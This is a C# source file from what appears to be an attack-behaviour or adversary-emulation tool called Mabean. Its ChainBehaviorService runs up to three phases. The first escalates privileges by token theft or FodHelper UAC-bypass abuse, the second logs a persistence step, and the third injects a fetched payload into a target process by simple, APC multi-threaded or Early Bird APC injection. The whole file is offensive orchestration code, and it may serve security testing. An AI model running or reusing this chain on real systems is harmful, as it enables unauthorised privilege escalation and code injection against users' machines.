using Mabean.Interop;
using Mabean.Models;
using System.Threading.Tasks;

namespace Mabean.Services;

public class ChainBehaviorService
{
    private readonly PayloadService _payloadService;

    public ChainBehaviorService(PayloadService payloadService)
    {
        _payloadService = payloadService;
    }

    public async Task RunChainAsync(BehaviorChainDefinition chain)
    {
        if (chain.PrivEsc is { } privEsc)
        {
            LoggerService.Write($"[Chain] Phase 1 - PrivEsc: {privEsc.Behavior}");
            switch (privEsc.Behavior)
            {
                case "TokenTheft":
                    var code1 = InteropPrivilegeEscalation.TokenTheftEscalation(privEsc.TargetPid ?? 0);
                    LoggerService.Write($"[Chain] TokenTheft result: {code1}");
                    break;
                case "FodHelperAbuse":
                    var code2 = InteropPrivilegeEscalation.FodHelperAbuseEscalation(privEsc.ExecPath);
                    LoggerService.Write($"[Chain] FodHelperAbuse result: {code2}");
                    break;
            }
        }

        if (chain.Persistence is { } persistence)
        {
            LoggerService.Write($"[Chain] Phase 2 - Persistence: {persistence.Behavior} (service: {persistence.ServiceName})");
        }

        if (chain.Injection is { } injection)
        {
            LoggerService.Write($"[Chain] Phase 3 - Injection: {injection.Behavior}");
            var payload = await PayloadService.GetPayload(injection.PayloadName);
            switch (injection.Behavior)
            {
                case "Simple":
                    var code3 = InteropInjection.InjectPayloadSimple(injection.TargetPid ?? 0, payload, (uint)payload.Length);
                    LoggerService.Write($"[Chain] Simple injection result: {code3}");
                    break;
                case "Apc-MultiThreaded":
                    var code4 = InteropInjection.InjectPayloadApcMultiThreaded(injection.TargetPid ?? 0, payload, (nuint)payload.Length);
                    LoggerService.Write($"[Chain] APC multi-threaded injection result: {code4}");
                    break;
                case "Apc-EarlyBird":
                    var code5 = InteropInjection.InjectPayloadApcEarlyBird(injection.ProgramName!, payload, (nuint)payload.Length);
                    LoggerService.Write($"[Chain] APC early bird injection result: {code5}");
                    break;
            }
        }
    }
}
